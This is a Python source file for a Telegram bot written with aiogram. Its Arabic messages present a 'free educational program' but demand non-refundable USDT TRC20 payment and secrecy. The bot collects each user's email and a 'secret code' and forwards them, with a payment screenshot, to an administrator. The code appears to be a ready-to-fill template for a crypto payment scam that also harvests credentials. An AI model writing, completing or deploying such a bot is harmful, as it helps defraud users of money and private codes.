import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor
import os

API_TOKEN = 'ضع_توكن_البوت_هنا'

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Form(StatesGroup):
    email = State()
    secret = State()
    screenshot = State()

@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    await message.answer(
        "🎓 مرحبًا بك في *برنامج Haures التعليمي المجاني*\n\n"
        "📋 قبل المتابعة، يرجى الموافقة على الشروط التالية:\n"
        "1. عدم مشاركة هذا البرنامج مع أي شخص.\n"
        "2. الدفع يجب أن يتم عبر USDT TRC20 فقط.\n"
        "3. لا يمكن استرداد المبلغ بعد الدفع.\n\n"
        "✅ إذا كنت موافقًا، أرسل بريدك الإلكتروني:",
        parse_mode="Markdown"
    )
    await Form.email.set()

@dp.message_handler(state=Form.email)
async def process_email(message: types.Message, state: FSMContext):
    email = message.text
    await state.update_data(email=email)
    await message.answer("🔐 الآن أرسل الرمز السري الذي حصلت عليه:")
    await Form.secret.set()

@dp.message_handler(state=Form.secret)
async def process_secret(message: types.Message, state: FSMContext):
    secret = message.text
    await state.update_data(secret=secret)

    payment_address = "TA1a2b3c4d5e6f7g8h9i0j..."  # عنوان USDT TRC20
    await message.answer(
        f"💰 للدفع، أرسل {payment_address}\n\n"
        "📸 بعد الدفع، أرسل لقطة شاشة تثبت العملية."
    )
    await Form.screenshot.set()

@dp.message_handler(content_types=types.ContentType.PHOTO, state=Form.screenshot)
async def process_screenshot(message: types.Message, state: FSMContext):
    file_id = message.photo[-1].file_id
    user_data = await state.get_data()

    email = user_data['email']
    secret = user_data['secret']

    # إرسال البيانات للإدارة
    admin_id = 123456789  # ضع معرفك الخاص
    await bot.send_message(admin_id, f"🆕 طلب جديد:\n📧 {email}\n🔐 {secret}")
    await bot.send_photo(admin_id, file_id, caption="🖼️ إثبات الدفع")

    await message.answer("✅ تم استلام إثبات الدفع، سيتم مراجعة معلوماتك قريبًا.")
    await state.finish()

if __name__ == '__main__':
    print("✅ البوت قيد التشغيل ...")
    executor.start_polling(dp, skip_updates=True)
